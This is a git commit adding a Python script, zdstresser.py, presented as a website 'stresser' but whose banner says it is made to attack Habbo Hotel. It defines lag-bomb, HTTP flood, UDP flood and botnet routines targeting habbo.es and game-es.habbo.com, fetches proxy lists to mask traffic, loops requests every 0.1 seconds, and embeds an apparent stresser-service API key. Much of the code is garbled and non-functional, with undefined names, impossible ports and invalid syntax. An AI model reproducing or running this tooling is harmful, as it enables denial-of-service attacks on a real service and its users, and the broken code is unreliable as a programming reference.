5ff4596b00c4a7a6d1382dafc7e087eda5f44d4c
Rootkit <114633752+retr0security@users.noreply.github.com>
2023-01-24 22:25:51 -0300

    Add files via upload

---
+++ zdstresser.py
@@ -0,0 +1,235 @@
+## Create API key at https://zdstresser.net
+## Script purpose: Stress test your website with a lot of requests
+## Script author: Rootkit
+## Script version: 1.0
+## Script language: Python
+## Script type: Web stresser
+
+
+
+import requests
+import time
+
+
+
+
+
+print ('''
+.__                                                           
+|  |__   __________________  ____   ____  ___________   ____  
+|  |  \ /  _ \_  __ \_  __ \/  _ \_/ ___\/  _ \_  __ \_/ __ \ 
+|   Y  (  <_> )  | \/|  | \(  <_> )  \__(  <_> )  | \/\  ___/ 
+|___|  /\____/|__|   |__|   \____/ \___  >____/|__|    \___  >
+     \/                                \/                  \/ 
+Version 1.0
+                              C0d3d by Horrocore
+┌─────────────────────────────────────────────┐
+│        Made To fuck Habbo!       │
+├─────────────────────────────────────────────┤
+│                 New stuff:                  │
+│          [+] Added  Proxy Support       │
+│          [+] Connected to Habbo API to made rq                   │
+│          [+] Support Attack Client           │
+├─────────────────────────────────────────────┤
+│ username: Horrocore │ made with <3
+└─────────────────────────────────────────────┘''')
+
+
+
+
+
+
+
+
+
+
+## Create a function to send GET Request to https://zdstresser.net/panel/apiv1/?userid=22642&key=AXBVT-70666-TQ45R&command=
+def send_request():
+    requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
+    print("Request sent")
+    send_request = requests.get("https://habbo.es/client")
+    print(send_request.text)
+    send_request = "URL"
+    send_request = "PORT"
+
+## Create a loop to send requests every 0.1 seconds
+while True:
+    send_request()
+    time.sleep(0.1)
+
+    ## Create a  function to do type of attack URL, IP, PORT
+    def attack_type():
+        attack_type = "URL"
+        attack_type = "IP"
+        attack_type = "PORT"
+        attack_type = send_request("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",)
+
+        ## Create a function to do type of attack UDP, TCP, HTTP, HTTPS, GET, POST, HEAD, OPTIONS, PUT, DELETE, TRACE, CONNECT
+        def attack_method():
+            attack_method = "UDP"
+            attack_method = "TCP"
+            attack_method = "HTTP"
+            attack_method = "HTTPS"
+            attack_method = "GET"
+            attack_method = "POST"
+            attack_method = "HEAD"
+            ## Create A room Lag In Habbo Hotel
+def habbo_lagbomb():
+    print("LAG BOMB")
+    habbo_lagbomb = input("Enter the room ID: ")
+    habbo_lagbomb = habbo_lagbomb.replace(" ", "")
+    habbo_lagbomb = habbo_lagbomb.connect(("http://www.habbo.com/gamedata/external_variables/0", 80))
+    HABBOLAGBOMB = habbo_lagbomb.recv(1024)
+    habbo_lagbomb.close()
+    print("Lag Bombing Room: " + habbo_lagbomb)
+    habbo_lagbomb = (Serverproy, 80)
+    habbo_lagbomb.connect(habbo_lagbomb)
+    habbo_lagbomb.send("GET /gamedata/external_variables/0 HTTP/1.1\r")
+    habbo_lagbomb = rq.send("Host: www.habbo.es\r")
+
+    ## Create a HTTP Flood in Habbo Hotel
+    def habbo_httpflood():
+        habbo_httpflood = input("Enter the room ID: ")
+        habbo_httpflood = (habbo_httpflood.rq, 30000)
+        habbo_httpflood = (habbo.roomid, (getid))
+        habbo_httpflood = server.replace("localhost ", " game-es.habbo.com")
+        ## if the server is not in the list, it will be added
+        if habbo_httpflood not in server:
+            server.append(habbo_httpflood)
+        print("HTTP Flooding Room: " + habbo_httpflood)
+        habbo_httpflood = (Serverproy, 80)
+        habbo_httpflood.connect(habbo_httpflood)
+        habbo_httpflood.send("GET /gamedata/external_variables/0 HTTP/1.1\r")
+        habbo_httpflood = rq.send("Host: www.habbo.es\r")
+        habbo_httpflood = client.recev(30000)
+        habbo_httpflood = client.close()
+        habbo_httpflood = habbo_httpflood.replace("80 ", "30000")
+
+        ## Create a UDP Flood in Habbo Hotel
+        def habbo_udpflood():
+            habbo_udpflood = input("Enter The Habbo Client IP: ")
+            habbo_udpflood = (habbo_udpflood.rq, 30000)
+            habbo_udpflood = (habbo.roomid, (getid))
+            habbo_udpflood = server.replace("localhost ", " game-es.habbo.com")
+            ## if the server its lagging, it will be ddosed
+            if habbo_udpflood not in server:
+                server.append(habbo_udpflood)
+            print("UDP Flooding Room: " + habbo_udpflood)
+            habbo_udpflood = (Serverproy, 80)
+            habbo_udpflood.connect(habbo_udpflood)
+            habbo_udpflood.send("GET /gamedate/external_variables/0 HTTP/1.1\r")
+            habbo_udpflood = rq.send("Host: www.habbo.es\r")
+            habbo_udpflood = client.recev(30000)
+            habbo_udpflood = client.close()
+            habbo_udpflood = habbo_udpflood.replace("80 ", "30000")
+
+            ## Create a Command Args
+            def habbo_args():
+                habbo_args = (-h, --help)
+                habbo_args = (-l, --lagbomb)
+                habbo_args = (-h, --httpflood)
+                habbo_args = (-u, --udpflood)
+                habbo_args = (-a, --all)
+                habbo_args = (-v, --version)
+                habbo_args = (-e, --exit)
+                habbo_args = (-c, --client)
+                habbo_args = (-s, --server)
+                habbo_args = (-p, --port)
+                habbo_args = (-r, --roomid)
+                habbo_args = (-i, --getid)
+
+                ## Create a Lag Module to Windows 10 Computers
+                def habbo_lagmodule():
+                    habbo_lagbomb = input("Enter the USERNAME: ")
+                    habbo_lagbomb = input("Enter the ROOM: ")
+                    HABBO_LAGBOMB = habbo_lagbomb.replace(server, "game-es.habbo.com")
+                    HABBO_LAGBOMB = habbo_lagbomb.replace(port, "30000")
+                    ## Create Request Threads
+                    def habbo_requestthreads():
+                        habbo_requestthreads = habbo_httpflood.threading(max.threads, 30000)
+                        habbo_requestthreads = habbo_udpflood.threading(max.threads, 30000)
+                        habbo_requestthreads = habbo_lagbomb.threading(min.threads, 450)
+                        habbo_requestthreads = () ## if the server its lagged, it will be ddosed
+                        if habbo_requestthreads not in server:
+                            server.append(habbo_requestthreads)
+                        print("Lag Bombing Room: " + habbo_requestthreads)
+                        habbo_requestthreads = (Serverproy, 80)
+                        habbo_requestthreads.connect(habbo_requestthreads)
+                        habbo_requestthreads.send("GET /gamedata/external_variables/0 HTTP/1.1\r")
+                        habbo_requestthreads = rq.send("Host: game-es.habbo.com\r")
+                        habbo_requestthreads = s.threads(30000)
+                        habbo_requestthreads = s.close()
+                        habbo_requestthreads = () ## if the room its not added, it will be added
+                        if habbo_requestthreads not in room:
+                            room.append(habbo_requestthreads)
+                        print("HTTP Flooding Room: " + habbo_requestthreads)
+                        habbo_requestthreads = (Serverproy, 80)
+                        habbo_requestthreads.connect(habbo_requestthreads)
+                        habbo_requestthreads.send("GET /gamedata/external_variables/0 HTTP/1.1\r")
+                        habbo_requestthreads = rq.send("Host: game-es.habbo.com\r")
+                        habbo_requestthreads = habbo.roomid(get)
+                        habbo_requestthreads = habbo.roomid.close()
+                        habbo_requestthreads = () ## if the room its not added, it will be added
+                        habbo_requestthreads (arguments, -threads, -max, -min)
+                        if habbo_requestthreads not in room:
+                            room.append(habbo_requestthreads)
+                        print("UDP Flooding Room: " + habbo_requestthreads)
+                        habbo_requestthreads = (Serverproy, 80)
+                        habbo_requestthreads.connect(habbo_requestthreads)
+                        habbo_requestthreads.send("GET /gamedata/external_variables/0 HTTP/1.1\r")
+                        habbo_requestthreads = rq.send("Host: game-es.habbo.com\r")
+
+                        habbo_requestthreads =  input("Host: game-es.habbo.com")
+
+                        ## Create a TcpServer to habbo client connections
+                        def habbo_tcpserver():
+                            habbo_tcpserver = habbo.tcpserver(habbo_requestthreads)
+                            habbo_tcpserver = habbo_udpflood.threading(max.threads, 30000)
+                            habbo_tcpserver = habbo_lagbomb.threading(habbo_httpflood, true)
+                            habbo_tcpserver.send = (habbo_tcpserver.receive.httpflood, ("game-es.habbo.com"))
+                            
+                            ## Create a Function to down Servers with httpflood
+                            def habbo_httpflood():
+                                habbo_httpflood = habbo.httpflood(habbo_requestthreads)
+
+                                ## Create a Choose Option for httpflood
+                                def habbo_httpflood_option():
+                                    habbo_httpflood_option = habbo.httpflood_option(habbo_requestthreads)
+                                    habbo_httpflood_option = habbo_udpflood.threading
+                                    habbo_httpflood_option = habbo_lagbomb.threading
+                                    habbo_httpflood_option = habbo_httpflood.threading
+                                    habbo_httpflood_option = habbo_httpflood.threading
+
+                                    ## Create a bot network with IP address
+                                    def habbo_botnet():
+                                        habbo_botnet = habbo.botnet(habbo_requestthreads)
+                                        habbo_botnet = habbo_udpflood.threading(max.threads, 30000)
+                                        habbo_botnet = habbo_lagbomb.threading(habbo_httpflood, true)
+                                        habbo_botnet.send = (habbo_botnet.receive.httpflood, ("game-es.habbo.com:30001"))
+                                        habbo_tcpserver = (habbo_botnet.tcp(300001, 30000))
+                                        
+                                        ## get Habbo widget users from habbo.es
+                                        def habbo_users():
+                                            habbo_users = habbo.users(habbo_requestthreads)
+                                            habbo_users = habbo_udpflood.threading(max.threads, 30000)
+                                            habbo_users = habbo_lagbomb.threading(habbo_httpflood, true)
+                                            habbo_users.send = (habbo_users.receive.httpflood, ("game-es.habbo.com:30001"))
+                                            habbo_tcpserver = (habbo_users.tcp(300001, 30000))
+                                            habbo_tcpserver.send = (habbo_tcpserver.receive.httpflood, ("game-es.habbo.com:30001"))
+                                            habbo_tcpserver = () ## if the server its bugged then send a httpflood
+                                            habbo_tcpserver.send = (habbo_tcpserver.receive.httpflood, ("game-es.habbo.com:300001"))
+
+                                            ## send a HTTP Flood request to the server
+                                            def habbo_httpflood():
+                                                habbo_httpflood = habbo.httpflood(habbo_requestthreads)
+                                                habbo_httpflood = (habbousers.tcp(300001, 30000))
+                                                habbo_httpflood.send = (s.requests, threading.Condition.max.threads, + 300000000)
+                                                habbo_httpflood = s.requests_allnetworks(ping -threads, + 300000000)
+                                                habbo_httpflood.send = (sendall.threads, + 300000000)
+                                                habbo_httpflood.send = (packets.rcv, + 300000000)
+                                                ## Create and send request from proxyscrape api https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all
+                                                habbo_httpflood_option = get.request("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
+                                                habbo_httpflood_option = habbo_httpflood_option.send("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
+                                                habbo_httpflood_option = send.request("proxy.scrape.com")
+
+
